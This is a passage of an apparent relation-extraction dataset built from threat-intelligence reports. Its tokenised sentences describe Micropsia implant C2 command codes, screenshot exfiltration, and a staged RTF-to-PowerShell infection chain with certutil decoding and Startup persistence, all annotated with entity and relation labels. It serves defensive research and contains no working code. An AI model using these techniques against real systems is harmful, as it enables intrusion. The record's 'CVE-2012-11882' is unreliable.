"global_pos": [57, 57], "name": "implant", "pos": [9, 10], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [65, 65], "name": "RAT", "pos": [17, 18], "index": "3_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [75, 75], "name": "C2 server", "pos": [27, 29], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [79, 79], "name": "implant", "pos": [1, 2], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [93, 93], "name": "commands", "pos": [15, 16], "index": "6_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [100, 100], "name": "C2", "pos": [1, 2], "index": "7_0"}]], "labels": [{"r": "ST", "evidence": [1], "t": 0, "h": 1}, {"r": "EX", "evidence": [1, 2], "h": 1, "t": 2}, {"r": "FR", "evidence": [1, 2], "h": 1, "t": 3}, {"r": "RF", "evidence": [1, 2], "h": 1, "t": 4}, {"r": "CO", "evidence": [1, 2], "h": 0, "t": 4}, {"r": "WR", "evidence": [2, 3], "h": 3, "t": 5}, {"r": "EX", "evidence": [2, 3], "h": 3, "t": 6}]}, {"title": "031-20", "sents": [["The", "data", "is", "then", "sent", "to", "the", "implant", "'s", "C2", "server", "via", "an", "HTTP", "POST", "request", ",", "which", "is", "fairly", "standard", "in", "Micropsia", "implants", "."], ["Once", "the", "preliminary", "information", "has", "been", "sent", ",", "the", "implant", "now", "begins", "its", "remote", "access", "trojan", "(", "RAT", ")", "activity", "and", "waits", "for", "command", "codes", "from", "the", "C2", "server", "."], ["The", "implant", "now", "uses", "two", "additional", "HTTP", "form", "variables", "to", "transmit", "the", "output", "of", "the", "commands", "executed", "on", "the", "endpoint", ":"], ["The", "C2", "issues", "distinct", "command", "codes", "to", "the", "implant", "to", "carry", "out", "various", "actions", "on", "the", "infected", "endpoint", "."], ["The", "commands", "follow", "the", "format", ":", ";", "<", "cmd_code", ">", ";", "<", "base64_encoded_supporting_data", ">", ";"], ["The", "above", "example", "would", "run", "the", "ipconfig", "command", "on", "the", "endpoint", "."], ["``", "1", "''", "or", "``", "2", "''", "or", "``", "sh", "''", "Capture", "screenshots", "to", "the", "%", "TEMP", "%", "directory", "and", "exfiltrate", "."], ["``", "log", "''", "Send", "the", "current", "activity", "log", "(", "recorded", "in", "an", "internal", "Memo", ")", "to", "the", "C2", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [9, 9], "name": "C2 server", "pos": [9, 11], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [22, 22], "name": "Micropsia implants", "pos": [22, 24], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [34, 34], "name": "implant", "pos": [9, 10], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [42, 42], "name": "RAT", "pos": [17, 18], "index": "3_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [52, 52], "name": "C2 server", "pos": [27, 29], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [56, 56], "name": "implant", "pos": [1, 2], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [70, 70], "name": "commands", "pos": [15, 16], "index": "6_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [77, 77], "name": "C2", "pos": [1, 2], "index": "7_0"}]], "labels": [{"r": "ST", "evidence": [0], "t": 0, "h": 1}, {"r": "EX", "evidence": [0, 1], "h": 1, "t": 2}, {"r": "FR", "evidence": [0, 1], "h": 1, "t": 3}, {"r": "RF", "evidence": [0, 1], "h": 1, "t": 4}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 4}, {"r": "WR", "evidence": [1, 2], "h": 3, "t": 5}, {"r": "EX", "evidence": [1, 2], "h": 3, "t": 6}]}, {"title": "031-21", "sents": [["Once", "the", "preliminary", "information", "has", "been", "sent", ",", "the", "implant", "now", "begins", "its", "remote", "access", "trojan", "(", "RAT", ")", "activity", "and", "waits", "for", "command", "codes", "from", "the", "C2", "server", "."], ["The", "implant", "now", "uses", "two", "additional", "HTTP", "form", "variables", "to", "transmit", "the", "output", "of", "the", "commands", "executed", "on", "the", "endpoint", ":"], ["The", "C2", "issues", "distinct", "command", "codes", "to", "the", "implant", "to", "carry", "out", "various", "actions", "on", "the", "infected", "endpoint", "."], ["The", "commands", "follow", "the", "format", ":", ";", "<", "cmd_code", ">", ";", "<", "base64_encoded_supporting_data", ">", ";"], ["The", "above", "example", "would", "run", "the", "ipconfig", "command", "on", "the", "endpoint", "."], ["``", "1", "''", "or", "``", "2", "''", "or", "``", "sh", "''", "Capture", "screenshots", "to", "the", "%", "TEMP", "%", "directory", "and", "exfiltrate", "."], ["``", "log", "''", "Send", "the", "current", "activity", "log", "(", "recorded", "in", "an", "internal", "Memo", ")", "to", "the", "C2", "."], ["``", "cmd", "''", "Execute", "the", "command", "specified", "and", "send", "output", "to", "C2", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [9, 9], "name": "implant", "pos": [9, 10], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [17, 17], "name": "RAT", "pos": [17, 18], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [27, 27], "name": "C2 server", "pos": [27, 29], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [31, 31], "name": "implant", "pos": [1, 2], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [45, 45], "name": "commands", "pos": [15, 16], "index": "4_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [52, 52], "name": "C2", "pos": [1, 2], "index": "5_0"}]], "labels": [{"r": "WR", "evidence": [0, 1], "h": 1, "t": 3}, {"r": "EX", "evidence": [0, 1], "h": 1, "t": 4}]}, {"title": "031-22", "sents": [["The", "implant", "now", "uses", "two", "additional", "HTTP", "form", "variables", "to", "transmit", "the", "output", "of", "the", "commands", "executed", "on", "the", "endpoint", ":"], ["The", "C2", "issues", "distinct", "command", "codes", "to", "the", "implant", "to", "carry", "out", "various", "actions", "on", "the", "infected", "endpoint", "."], ["The", "commands", "follow", "the", "format", ":", ";", "<", "cmd_code", ">", ";", "<", "base64_encoded_supporting_data", ">", ";"], ["The", "above", "example", "would", "run", "the", "ipconfig", "command", "on", "the", "endpoint", "."], ["``", "1", "''", "or", "``", "2", "''", "or", "``", "sh", "''", "Capture", "screenshots", "to", "the", "%", "TEMP", "%", "directory", "and", "exfiltrate", "."], ["``", "log", "''", "Send", "the", "current", "activity", "log", "(", "recorded", "in", "an", "internal", "Memo", ")", "to", "the", "C2", "."], ["``", "cmd", "''", "Execute", "the", "command", "specified", "and", "send", "output", "to", "C2", "."], ["``", "df", "''", "Download", "file", "from", "a", "specified", "remote", "location", "into", "a", "local", "path", "specified", "by", "the", "C2", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "implant", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [15, 15], "name": "commands", "pos": [15, 16], "index": "1_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [22, 22], "name": "C2", "pos": [1, 2], "index": "2_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [138, 138], "name": "C2", "pos": [17, 18], "index": "3_0"}]], "labels": []}, {"title": "031-23", "sents": [["The", "C2", "issues", "distinct", "command", "codes", "to", "the", "implant", "to", "carry", "out", "various", "actions", "on", "the", "infected", "endpoint", "."], ["The", "commands", "follow", "the", "format", ":", ";", "<", "cmd_code", ">", ";", "<", "base64_encoded_supporting_data", ">", ";"], ["The", "above", "example", "would", "run", "the", "ipconfig", "command", "on", "the", "endpoint", "."], ["``", "1", "''", "or", "``", "2", "''", "or", "``", "sh", "''", "Capture", "screenshots", "to", "the", "%", "TEMP", "%", "directory", "and", "exfiltrate", "."], ["``", "log", "''", "Send", "the", "current", "activity", "log", "(", "recorded", "in", "an", "internal", "Memo", ")", "to", "the", "C2", "."], ["``", "cmd", "''", "Execute", "the", "command", "specified", "and", "send", "output", "to", "C2", "."], ["``", "df", "''", "Download", "file", "from", "a", "specified", "remote", "location", "into", "a", "local", "path", "specified", "by", "the", "C2", "."], ["``", "lehar", "''", "Ask", "for", "the", "next", "command", "from", "the", "C2", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [1, 1], "name": "C2", "pos": [1, 2], "index": "0_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [117, 117], "name": "C2", "pos": [17, 18], "index": "1_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [129, 129], "name": "C2", "pos": [10, 11], "index": "2_0"}]], "labels": []}, {"title": "031-24", "sents": [["The", "commands", "follow", "the", "format", ":", ";", "<", "cmd_code", ">", ";", "<", "base64_encoded_supporting_data", ">", ";"], ["The", "above", "example", "would", "run", "the", "ipconfig", "command", "on", "the", "endpoint", "."], ["``", "1", "''", "or", "``", "2", "''", "or", "``", "sh", "''", "Capture", "screenshots", "to", "the", "%", "TEMP", "%", "directory", "and", "exfiltrate", "."], ["``", "log", "''", "Send", "the", "current", "activity", "log", "(", "recorded", "in", "an", "internal", "Memo", ")", "to", "the", "C2", "."], ["``", "cmd", "''", "Execute", "the", "command", "specified", "and", "send", "output", "to", "C2", "."], ["``", "df", "''", "Download", "file", "from", "a", "specified", "remote", "location", "into", "a", "local", "path", "specified", "by", "the", "C2", "."], ["``", "lehar", "''", "Ask", "for", "the", "next", "command", "from", "the", "C2", "."], ["We", "have", "observed", "implants", "using", "two", "distinct", "URLs", "to", "instrument", "communications", "with", "the", "C2", ",", "one", "for", "exfiltration", "of", "screenshots", "and", "the", "other", "for", "all", "the", "other", "RAT", "commands", "."]], "vertexSet": [[{"type": "SO", "sent_id": 5, "global_pos": [98, 98], "name": "C2", "pos": [17, 18], "index": "0_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [110, 110], "name": "C2", "pos": [10, 11], "index": "1_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [119, 119], "name": "URLs", "pos": [7, 8], "index": "2_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [125, 125], "name": "C2", "pos": [13, 14], "index": "3_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [139, 139], "name": "RAT commands", "pos": [27, 29], "index": "4_0"}]], "labels": []}, {"title": "031-25", "sents": [["The", "above", "example", "would", "run", "the", "ipconfig", "command", "on", "the", "endpoint", "."], ["``", "1", "''", "or", "``", "2", "''", "or", "``", "sh", "''", "Capture", "screenshots", "to", "the", "%", "TEMP", "%", "directory", "and", "exfiltrate", "."], ["``", "log", "''", "Send", "the", "current", "activity", "log", "(", "recorded", "in", "an", "internal", "Memo", ")", "to", "the", "C2", "."], ["``", "cmd", "''", "Execute", "the", "command", "specified", "and", "send", "output", "to", "C2", "."], ["``", "df", "''", "Download", "file", "from", "a", "specified", "remote", "location", "into", "a", "local", "path", "specified", "by", "the", "C2", "."], ["``", "lehar", "''", "Ask", "for", "the", "next", "command", "from", "the", "C2", "."], ["We", "have", "observed", "implants", "using", "two", "distinct", "URLs", "to", "instrument", "communications", "with", "the", "C2", ",", "one", "for", "exfiltration", "of", "screenshots", "and", "the", "other", "for", "all", "the", "other", "RAT", "commands", "."], ["For", "example", "one", "of", "the", "implants", "used", "a", "distinct", "URL", "for", "screenshots", ":"]], "vertexSet": [[{"type": "SO", "sent_id": 4, "global_pos": [83, 83], "name": "C2", "pos": [17, 18], "index": "0_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [95, 95], "name": "C2", "pos": [10, 11], "index": "1_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [104, 104], "name": "URLs", "pos": [7, 8], "index": "2_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [110, 110], "name": "C2", "pos": [13, 14], "index": "3_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [124, 124], "name": "RAT commands", "pos": [27, 29], "index": "4_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [136, 136], "name": "URL", "pos": [9, 10], "index": "5_0"}]], "labels": []}, {"title": "031-26", "sents": [["``", "1", "''", "or", "``", "2", "''", "or", "``", "sh", "''", "Capture", "screenshots", "to", "the", "%", "TEMP", "%", "directory", "and", "exfiltrate", "."], ["``", "log", "''", "Send", "the", "current", "activity", "log", "(", "recorded", "in", "an", "internal", "Memo", ")", "to", "the", "C2", "."], ["``", "cmd", "''", "Execute", "the", "command", "specified", "and", "send", "output", "to", "C2", "."], ["``", "df", "''", "Download", "file", "from", "a", "specified", "remote", "location", "into", "a", "local", "path", "specified", "by", "the", "C2", "."], ["``", "lehar", "''", "Ask", "for", "the", "next", "command", "from", "the", "C2", "."], ["We", "have", "observed", "implants", "using", "two", "distinct", "URLs", "to", "instrument", "communications", "with", "the", "C2", ",", "one", "for", "exfiltration", "of", "screenshots", "and", "the", "other", "for", "all", "the", "other", "RAT", "commands", "."], ["For", "example", "one", "of", "the", "implants", "used", "a", "distinct", "URL", "for", "screenshots", ":"], ["While", "another", "URL", "was", "used", "for", "all", "other", "commands", ":"]], "vertexSet": [[{"type": "SO", "sent_id": 3, "global_pos": [71, 71], "name": "C2", "pos": [17, 18], "index": "0_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [83, 83], "name": "C2", "pos": [10, 11], "index": "1_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [92, 92], "name": "URLs", "pos": [7, 8], "index": "2_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [98, 98], "name": "C2", "pos": [13, 14], "index": "3_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [112, 112], "name": "RAT commands", "pos": [27, 29], "index": "4_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [124, 124], "name": "URL", "pos": [9, 10], "index": "5_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [130, 130], "name": "URL", "pos": [2, 3], "index": "6_0"}]], "labels": []}, {"title": "044-0", "sents": [["At", "the", "start", "of", "2021", ",", "the", "threat", "actor", "used", "a", "unique", "infection", "method", "."], ["The", "malicious", "RTF", "file", "exploited", "the", "Office", "vulnerability", "CVE-2012-11882", "to", "run", "a", "PowerShell", "command", "(", "``", "Stage", "1", "''", ")", "that", "extracted", "and", "executed", "the", "next", "PowerShell", "script", "(", "``", "Stage", "2", "''", ")", "."], ["Stage", "1", "decodes", "the", "next-stage", "payload", "via", "certutil.exe", ",", "drops", "it", "to", "disk", ",", "and", "then", "executes", "it", "."], ["The", "Stage", "2", "payload", "remains", "base64-encoded", "as", "a", "counterfeit", "certificate", "within", "the", "maldoc", "."], ["The", "following", "PowerShell", "script", "(", "Stage", "2", ")", "decodes", "another", "payload", "(", "in", "this", "case", "a", "loader", "executable", ")", "and", "activates", "it", "on", "the", "infected", "device", "."], ["To", "begin", ",", "the", "loader", "executable", "establishes", "persistence", "by", "creating", "a", "shortcut", "in", "the", "current", "user", "'s", "Startup", "directory", "."], ["The", "executable", "then", "compiles", "hardcoded", "C", "#", "code", "into", "an", "executable", "assembly", "and", "runs", "the", "entry", "point", "for", "the", "compiled", "malicious", "code", "."], ["The", "final", "payload", "consists", "of", "C", "#", "code", "compiled", "and", "invoked", "into", "the", "Stage", "3", "compiler", "process", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [8, 8], "name": "actor", "pos": [8, 9], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [12, 12], "name": "infection", "pos": [12, 13], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [17, 17], "name": "RTF", "pos": [2, 3], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [23, 23], "name": "CVE-2012-11882", "pos": [8, 9], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [27, 27], "name": "PowerShell command", "pos": [12, 14], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [41, 41], "name": "PowerShell script", "pos": [26, 28], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [50, 50], "name": "Stage 1", "pos": [0, 2], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [55, 55], "name": "payload", "pos": [5, 6], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [57, 57], "name": "certutil.exe", "pos": [7, 8], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [72, 72], "name": "payload", "pos": [3, 4], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [78, 78], "name": "certificate", "pos": [9, 10], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [85, 85], "name": "PowerShell script", "pos": [2, 4], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [88, 88], "name": "Stage 2", "pos": [5, 7], "index": "12_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [92, 92], "name": "another", "pos": [9, 10], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [93, 93], "name": "payload", "pos": [10, 11], "index": "14_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [99, 99], "name": "loader executable", "pos": [16, 18], "index": "15_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [114, 114], "name": "loader executable", "pos": [4, 6], "index": "16_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [121, 121], "name": "shortcut", "pos": [11, 12], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [130, 130], "name": "The executable", "pos": [0, 2], "index": "18_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [135, 135], "name": "C # code", "pos": [5, 8], "index": "19_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [140, 140], "name": "executable assembly", "pos": [10, 12], "index": "20_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [149, 149], "name": "compiled malicious code", "pos": [19, 22], "index": "21_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [154, 154], "name": "final payload", "pos": [1, 3], "index": "22_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [168, 168], "name": "compiler process", "pos": [15, 17], "index": "23_0"}]], "labels": [{"r": "WR", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "RD", "evidence": [0, 1], "h": 1, "t": 3}, {"r": "EX", "evidence": [1], "h": 2, "t": 3}, {"r": "EX", "evidence": [1], "h": 2, "t": 4}, {"r": "WR", "evidence": [1], "h": 2, "t": 5}, {"r": "EX", "evidence": [1], "h": 2, "t": 5}, {"r": "EX", "evidence": [2], "h": 6, "t": 7}, {"r": "FR", "evidence": [2], "h": 6, "t": 8}, {"r": "WR", "evidence": [2], "t": 7, "h": 8}, {"r": "WR", "evidence": [2, 3], "h": 8, "t": 9}, {"r": "WR", "evidence": [2, 3], "h": 8, "t": 10}, {"r": "WR", "evidence": [2, 3, 4], "h": 8, "t": 11}, {"r": "WR", "evidence": [3, 4], "t": 9, "h": 12}, {"r": "WR", "evidence": [3, 4], "t": 10, "h": 12}, {"r": "WR", "evidence": [4], "t": 11, "h": 12}, {"r": "WR", "evidence": [4], "h": 12, "t": 14}, {"r": "RD", "evidence": [4], "h": 13, "t": 14}, {"r": "WR", "evidence": [4], "h": 13, "t": 14}, {"r": "WR", "evidence": [4], "h": 13, "t": 15}, {"r": "WR", "evidence": [4, 5], "t": 15, "h": 16}, {"r": "FR", "evidence": [5], "h": 16, "t": 17}, {"r": "CO", "evidence": [5, 6], "h": 16, "t": 18}, {"r": "RD", "evidence": [6], "h": 18, "t": 19}, {"r": "WR", "evidence": [6], "h": 18, "t": 20}, {"r": "CO", "evidence": [6], "h": 20, "t": 21}]}, {"title": "044-1", "sents": [["The", "malicious", "RTF", "file", "exploited", "the", "Office", "vulnerability", "CVE-2012-11882", "to", "run", "a", "PowerShell", "command", "(", "``", "Stage", "1", "''", ")", "that", "extracted", "and", "executed", "the", "next", "PowerShell", "script", "(", "``", "Stage", "2", "''", ")", "."], ["Stage", "1", "decodes", "the", "next-stage", "payload", "via", "certutil.exe", ",", "drops", "it", "to", "disk", ",", "and", "then", "executes", "it", "."], ["The", "Stage", "2", "payload", "remains", "base64-encoded", "as", "a", "counterfeit", "certificate", "within", "the", "maldoc", "."], ["The", "following", "PowerShell", "script", "(", "Stage", "2", ")", "decodes", "another", "payload", "(", "in", "this", "case", "a", "loader", "executable", ")", "and", "activates", "it", "on", "the", "infected", "device", "."], ["To", "begin", ",", "the", "loader", "executable", "establishes", "persistence", "by", "creating", "a", "shortcut", "in", "the", "current", "user", "'s", "Startup", "directory", "."], ["The", "executable", "then", "compiles", "hardcoded", "C", "#", "code", "into", "an", "executable", "assembly", "and", "runs", "the", "entry", "point", "for", "the", "compiled", "malicious", "code", "."], ["The", "final", "payload", "consists", "of", "C", "#", "code", "compiled", "and", "invoked", "into", "the", "Stage", "3", "compiler", "process", "."], ["The", "File", "Enumerator", "module", "catalogs", "specific", "file", "types", "on", "the", "machine", "and", "transfers", "the", "path", "information", "to", "the", "C2", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "RTF", "pos": [2, 3], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [8, 8], "name": "CVE-2012-11882", "pos": [8, 9], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [12, 12], "name": "PowerShell command", "pos": [12, 14], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [26, 26], "name": "PowerShell script", "pos": [26, 28], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [35, 35], "name": "Stage 1", "pos": [0, 2], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [40, 40], "name": "payload", "pos": [5, 6], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [42, 42], "name": "certutil.exe", "pos": [7, 8], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [57, 57], "name": "payload", "pos": [3, 4], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [63, 63], "name": "certificate", "pos": [9, 10], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [70, 70], "name": "PowerShell script", "pos": [2, 4], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [73, 73], "name": "Stage 2", "pos": [5, 7], "index": "10_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [77, 77], "name": "another", "pos": [9, 10], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [78, 78], "name": "payload", "pos": [10, 11], "index": "12_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [84, 84], "name": "loader executable", "pos": [16, 18], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [99, 99], "name": "loader executable", "pos": [4, 6], "index": "14_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [106, 106], "name": "shortcut", "pos": [11, 12], "index": "15_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [115, 115], "name": "The executable", "pos": [0, 2], "index": "16_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [120, 120], "name": "C # code", "pos": [5, 8], "index": "17_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [125, 125], "name": "executable assembly", "pos": [10, 12], "index": "18_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [134, 134], "name": "compiled malicious code", "pos": [19, 22], "index": "19_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [139, 139], "name": "final payload", "pos": [1, 3], "index": "20_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [153, 153], "name": "compiler process", "pos": [15, 17], "index": "21_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [157, 157], "name": "File Enumerator", "pos": [1, 3], "index": "22_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [170, 170], "name": "path", "pos": [14, 15], "index": "23_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [174, 174], "name": "C2", "pos": [18, 19], "index": "24_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "EX", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [0], "h": 0, "t": 3}, {"r": "EX", "evidence": [0], "h": 0, "t": 3}, {"r": "EX", "evidence": [1], "h": 4, "t": 5}, {"r": "FR", "evidence": [1], "h": 4, "t": 6}, {"r": "WR", "evidence": [1], "t": 5, "h": 6}, {"r": "WR", "evidence": [1, 2], "h": 6, "t": 7}, {"r": "WR", "evidence": [1, 2], "h": 6, "t": 8}, {"r": "WR", "evidence": [1, 2, 3], "h": 6, "t": 9}, {"r": "WR", "evidence": [2, 3], "t": 7, "h": 10}, {"r": "WR", "evidence": [2, 3], "t": 8, "h": 10}, {"r": "WR", "evidence": [3], "t": 9, "h": 10}, {"r": "WR", "evidence": [3], "h": 10, "t": 12}, {"r": "RD", "evidence": [3], "h": 11, "t": 12}, {"r": "WR", "evidence": [3], "h": 11, "t": 12}, {"r": "WR", "evidence": [3], "h": 11, "t": 13}, {"r": "WR", "evidence": [3, 4], "t": 13, "h": 14}, {"r": "FR", "evidence": [4], "h": 14, "t": 15}, {"r": "CO", "evidence": [4, 5], "h": 14, "t": 16}, {"r": "RD", "evidence": [5], "h": 16, "t": 17}, {"r": "WR", "evidence": [5], "h": 16, "t": 18}, {"r": "CO", "evidence": [5], "h": 18, "t": 19}, {"r": "FR", "evidence": [6, 7], "h": 21, "t": 22}, {"r": "EX", "evidence": [6, 7], "t": 20, "h": 22}, {"r": "WR", "evidence": [7], "h": 22, "t": 23}, {"r": "ST", "evidence": [7], "h": 22, "t": 24}]}, {"title": "044-2", "sents": [["Stage", "1", "decodes", "the", "next-stage", "payload", "via", "certutil.exe", ",", "drops", "it", "to", "disk", ",", "and", "then", "executes", "it", "."], ["The", "Stage", "2", "payload", "remains", "base64-encoded", "as", "a", "counterfeit", "certificate", "within", "the", "maldoc", "."], ["The", "following", "PowerShell", "script", "(", "Stage", "2", ")", "decodes", "another", "payload", "(", "in", "this", "case", "a", "loader", "executable", ")", "and", "activates", "it", "on", "the", "infected", "device", "."], ["To", "begin", ",", "the", "loader", "executable", "establishes", "persistence", "by", "creating", "a", "shortcut", "in", "the", "current", "user", "'s", "Startup", "directory", "."], ["The", "executable", "then", "compiles", "hardcoded", "C", "#", "code", "into", "an", "executable", "assembly", "and", "runs", "the", "entry", "point", "for", "the", "compiled", "malicious", "code", "."], ["The", "final", "payload", "consists", "of", "C", "#", "code", "compiled", "and", "invoked", "into", "the", "Stage", "3", "compiler", "process", "."], ["The", "File", "Enumerator", "module", "catalogs", "specific", "file", "types", "on", "the", "machine", "and", "transfers", "the", "path", "information", "to", "the", "C2", "."], ["These", "modules", "infect", "benign", "Office", "documents", "with", "malicious", "OLE", "objects", "to", "weaponize", "them", "to", "exploit", "CVE-2017-11882", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "Stage 1", "pos": [0, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "payload", "pos": [5, 6], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [7, 7], "name": "certutil.exe", "pos": [7, 8], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [22, 22], "name": "payload", "pos": [3, 4], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [28, 28], "name": "certificate", "pos": [9, 10], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [35, 35], "name": "PowerShell script", "pos": [2, 4], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [38, 38], "name": "Stage 2", "pos": [5, 7], "index": "6_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [42, 42], "name": "another", "pos": [9, 10], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [43, 43], "name": "payload", "pos": [10, 11], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [49, 49], "name": "loader executable", "pos": [16, 18], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [64, 64], "name": "loader executable", "pos": [4, 6], "index": "10_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [71, 71], "name": "shortcut", "pos": [11, 12], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [80, 80], "name": "The executable", "pos": [0, 2], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [85, 85], "name": "C # code", "pos": [5, 8], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [90, 90], "name": "executable assembly", "pos": [10, 12], "index": "14_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [99, 99], "name": "compiled malicious code", "pos": [19, 22], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [104, 104], "name": "final payload", "pos": [1, 3], "index": "16_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [118, 118], "name": "compiler process", "pos": [15, 17], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [122, 122], "name": "File Enumerator", "pos": [1, 3], "index": "18_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [135, 135], "name": "path", "pos": [14, 15], "index": "19_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [139, 139], "name": "C2", "pos": [18, 19], "index": "20_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [142, 142], "name": "modules", "pos": [1, 2], "index": "21_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [145, 145], "name": "Office documents", "pos": [4, 6], "index": "22_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [0], "t": 1, "h": 2}, {"r": "WR", "evidence": [0, 1], "h": 2, "t": 3}, {"r": "WR", "evidence": [0, 1], "h": 2, "t": 4}, {"r": "WR", "evidence": [0, 1, 2], "h": 2, "t": 5}, {"r": "WR", "evidence": [1, 2], "t": 3, 